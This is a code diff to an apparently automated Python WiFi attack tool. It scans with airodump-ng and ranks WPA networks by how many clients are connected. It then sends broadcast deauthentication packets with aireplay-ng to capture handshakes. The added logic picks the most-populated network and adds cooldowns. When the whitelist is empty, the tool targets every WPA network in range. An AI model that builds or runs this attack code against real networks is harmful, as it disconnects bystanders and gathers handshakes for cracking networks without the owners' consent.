@@ -11,6 +11,7 @@ import threading
 import logging
 from datetime import datetime
 from typing import List, Dict, Optional
+from .interface_manager import resolve_interfaces
 
 logger = logging.getLogger(__name__)
 
@@ -23,20 +24,15 @@ class WiFiScanner:
         self.config = config
         self.db = database
         
-        # Auto-detect WiFi interface
-        self.management_mac = "dc:a6:32:9e:ea:ba"
-        detected = self._detect_wifi_interfaces()
+        # Resolve interfaces by MAC address (handles USB adapter name swapping)
+        interfaces = resolve_interfaces(config)
+        self.interface = interfaces['monitor']  # For passive scanning
+        self.attack_interface = interfaces['attack']  # For deauth/handshake captures
+        self.management_interface = interfaces['management']  # SSH - DO NOT TOUCH
         
-        if not detected:
-            raise Exception("No external WiFi adapter found!")
-        
-        logger.info(f"Detected external WiFi adapters: {detected}")
-        
-        self.interface = detected[0]  # Use first external adapter (monitor)
-        self.attack_interface = detected[1] if len(detected) >= 2 else detected[0]  # Use second adapter for attack if available
-        logger.info(f"Using WiFi interface: {self.interface} (scanning)")
+        logger.info(f"Using monitor interface: {self.interface} (scanning)")
         logger.info(f"Using attack interface: {self.attack_interface} (deauth)")
-        logger.info(f"Management interface (DO NOT TOUCH): wlan2 (dc:a6:32:9e:ea:ba)")
+        logger.info(f"Management interface (DO NOT TOUCH): {self.management_interface}")
         
         self.whitelist_ssids = set(config['whitelist']['ssids'])
         self.running = False
@@ -50,6 +46,13 @@ class WiFiScanner:
         self.active_captures = {}
         self.handshake_dir = "./handshakes"
         os.makedirs(self.handshake_dir, exist_ok=True)
+        
+        # Track active scan process
+        self.active_scan_process = None
+        
+        # Track last capture time per BSSID (prevents spamming same network)
+        self.last_capture_time = {}  # bssid -> timestamp
+        self.capture_cooldown = 300  # Don't re-capture same network for 5 minutes
         
         self.handshake_timeout = config['wifi']['handshake_timeout']
         
@@ -71,6 +74,17 @@ class WiFiScanner:
             
             logger.info("🔒 Pausing WiFi scanner for enumeration...")
             self.enumeration_active = True
+            
+            # Stop active scan process if running
+            if self.active_scan_process and self.active_scan_process.poll() is None:
+                try:
+                    self.active_scan_process.terminate()
+                    self.active_scan_process.wait(timeout=5)
+                    logger.debug("Stopped active scan")
+                except Exception as e:
+                    logger.debug(f"Error stopping scan: {e}")
+                finally:
+                    self.active_scan_process = None
             
             # Stop all active captures - enumeration needs the attack interface
             for bssid in list(self.active_captures.keys()):
@@ -95,11 +109,8 @@ class WiFiScanner:
             logger.info("🔓 Resuming WiFi scanner after enumeration...")
             self.enumeration_active = False
             
-            # Re-enable monitor mode on attack interface in case enumeration changed it
-            try:
-                self._enable_monitor_mode(self.attack_interface)
-            except Exception as e:
-                logger.error(f"Failed to restore monitor mode: {e}")
+            # No need to restore monitor mode - attack interface (wlan0) stays in managed mode
+            # Only monitor interface (wlan2) is used for deauth/captures
             
             logger.info("✓ WiFi scanner resumed - normal operations")
     
@@ -196,6 +207,18 @@ class WiFiScanner:
         
         while self.running:
             try:
+                # Skip scanning if enumeration is active
+                if self.enumeration_active:
+                    logger.debug("Skipping scan - enumeration active")
+                    time.sleep(2)
+                    continue
+                
+                # Skip scanning if handshake capture is active
+                if len(self.active_captures) > 0:
+                    logger.debug("Skipping scan - handshake capture active")
+                    time.sleep(2)
+                    continue
+                
                 # Run airodump-ng scan for 10 seconds
                 scan_file = os.path.join(self.scan_dir, f"scan_{int(time.time())}")
                 
@@ -205,7 +228,7 @@ class WiFiScanner:
                 # --output-format csv: CSV output only
                 # -w: write to file
                 # Scan both 2.4GHz (1-13) and 5GHz (36-165) channels
-                process = subprocess.Popen([
+                self.active_scan_process = subprocess.Popen([
                     'airodump-ng',
                     '--output-format', 'csv',
                     '-w', scan_file,
@@ -213,12 +236,29 @@ class WiFiScanner:
                     self.interface
                 ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
-                # Let it scan for 10 seconds
-                time.sleep(10)
+                # Let it scan for 10 seconds (check enumeration flag every second)
+                for _ in range(10):
+                    time.sleep(1)
+                    # If enumeration starts during scan, abort immediately
+                    if self.enumeration_active and self.active_scan_process:
+                        logger.debug("Enumeration started - aborting scan")
+                        try:
+                            self.active_scan_process.terminate()
+                            self.active_scan_process.wait(timeout=5)
+                        except Exception as e:
+                            logger.debug(f"Error aborting scan: {e}")
+                        self.active_scan_process = None
+                        break
                 
-                # Stop airodump-ng
-                process.terminate()
-                process.wait(timeout=5)
+                # Stop airodump-ng if still running
+                if self.active_scan_process and self.active_scan_process.poll() is None:
+                    try:
+                        self.active_scan_process.terminate()
+                        self.active_scan_process.wait(timeout=5)
+                    except Exception as e:
+                        logger.debug(f"Error stopping scan: {e}")
+                
+                self.active_scan_process = None
                 
                 # Parse results
                 self._parse_scan_results(scan_file + '-01.csv')
@@ -326,11 +366,21 @@ class WiFiScanner:
                             is_whitelisted = essid in self.whitelist_ssids
                             self.db.set_whitelist(bssid, is_whitelisted)
                     
-                    # Start handshake capture if WPA/WPA2 and in whitelist (or whitelist empty)
+                    # Store candidate for handshake capture
+                    # We'll prioritize networks with clients later
                     if 'WPA' in enc_type and bssid not in self.active_captures:
-                        # Only attack if no whitelist or network is in whitelist
+                        # Check cooldown - don't re-capture same network too quickly
+                        last_capture = self.last_capture_time.get(bssid, 0)
+                        time_since_capture = time.time() - last_capture
+                        
+                        if time_since_capture < self.capture_cooldown:
+                            # Skip this network - captured too recently
+                            continue
+                        
+                        # Only consider if no whitelist or network is in whitelist
                         if not self.whitelist_ssids or essid in self.whitelist_ssids:
-                            self._start_handshake_capture(bssid, essid, channel_num)
+                            # Store for prioritization (will be handled after parsing ALL networks)
+                            self.networks[bssid]['capture_candidate'] = True
                         else:
                             logger.debug(f"Network {essid} discovered but not attacking - not in whitelist")
                 
@@ -339,9 +389,89 @@ class WiFiScanner:
             
             if networks_found > 0:
                 logger.info(f"📡 Scan complete: {networks_found} new network(s) found")
+            
+            # Now parse clients section to see which networks have connected devices
+            self._parse_clients_and_prioritize(sections, csv_file)
         
         except Exception as e:
             logger.error(f"Failed to parse scan results: {e}")
+    
+    def _parse_clients_and_prioritize(self, sections: List[str], csv_file: str):
+        """Parse client section and start capture for network with most clients"""
+        try:
+            # Only start a capture if we don't have one running
+            if len(self.active_captures) > 0:
+                return
+            
+            # Get networks that are candidates for capture
+            candidates = {bssid: info for bssid, info in self.networks.items() 
+                         if info.get('capture_candidate', False)}
+            
+            if not candidates:
+                return
+            
+            # Parse clients section (second section after blank line)
+            network_clients = {}  # bssid -> client_count
+            
+            if len(sections) > 1:
+                client_lines = sections[1].split('\n')
+                
+                # Find header
+                header_idx = None
+                for i, line in enumerate(client_lines):
+                    if 'Station MAC' in line or 'BSSID' in line:
+                        header_idx = i
+                        break
+                
+                if header_idx is not None:
+                    # Parse client associations
+                    for line in client_lines[header_idx + 1:]:
+                        if not line.strip():
+                            continue
+                        parts = [p.strip() for p in line.split(',')]
+                        if len(parts) >= 6:
+                            # Station MAC, First time seen, Last time seen, Power, packets, BSSID, Probed ESSIDs
+                            client_mac = parts[0]
+                            ap_bssid = parts[5] if len(parts) > 5 else ''
+                            
+                            # Skip (not associated) clients
+                            if ap_bssid and ap_bssid != '(not associated)' and ap_bssid in candidates:
+                                network_clients[ap_bssid] = network_clients.get(ap_bssid, 0) + 1
+            
+            # Prioritize networks with clients, then by signal strength
+            best_bssid = None
+            best_score = -1000
+            
+            for bssid, info in candidates.items():
+                client_count = network_clients.get(bssid, 0)
+                signal = info.get('signal', -100)
+                
+                # Score: clients are most important (10x weight), then signal
+                score = (client_count * 10) + (signal / 10)
+                
+                if score > best_score:
+                    best_score = score
+                    best_bssid = bssid
+            
+            if best_bssid:
+                info = self.networks[best_bssid]
+                client_count = network_clients.get(best_bssid, 0)
+                
+                # Clear capture_candidate flag
+                info['capture_candidate'] = False
+                
+                if client_count > 0:
+                    logger.info(f"🎯 Prioritizing {info['ssid']} ({client_count} client(s) connected)")
+                else:
+                    logger.info(f"⚠️  Starting capture for {info['ssid']} (no clients detected)")
+                
+                # Record capture time for cooldown tracking
+                self.last_capture_time[best_bssid] = time.time()
+                
+                self._start_handshake_capture(best_bssid, info['ssid'], info['channel'])
+        
+        except Exception as e:
+            logger.debug(f"Error parsing clients: {e}")
     
     def _parse_encryption(self, privacy: str, row: Dict) -> str:
         """Parse encryption type from airodump output"""
@@ -462,7 +592,7 @@ class WiFiScanner:
             # Don't try to set channel - airodump is already locking it to the correct channel
             # Just verify we're in monitor mode
             
-            logger.info(f"About to run aireplay-ng: BSSID={bssid}, CH={channel}, Interface={self.attack_interface}")
+            logger.info(f"About to run aireplay-ng: BSSID={bssid}, CH={channel}, Interface={self.interface}")
             
             # Send deauth packets to broadcast (all clients)
             # --deauth: number of deauth packets to send (increased to 20 for better coverage)
@@ -474,7 +604,7 @@ class WiFiScanner:
                 '--deauth', '20',
                 '-a', bssid,
                 '-D',  # Don't wait for beacon - directly inject
-                self.attack_interface  # Use attack interface for deauth
+                self.interface  # Use monitor interface for deauth (wlan2), keep attack interface (wlan0) clean for enumeration
             ], capture_output=True, text=True, timeout=30)
             
             logger.info(f"aireplay completed!")
@@ -494,7 +624,7 @@ class WiFiScanner:
                     'aireplay-ng',
                     '--deauth', '20',
                     '-a', bssid,
-                    self.attack_interface  # Use attack interface for follow-up deauth
+                    self.interface  # Use monitor interface for follow-up deauth
                 ], capture_output=True, text=True, timeout=30)
                 if result2.returncode == 0:
                     logger.info(f"✓ Follow-up deauth sent to {ssid}")
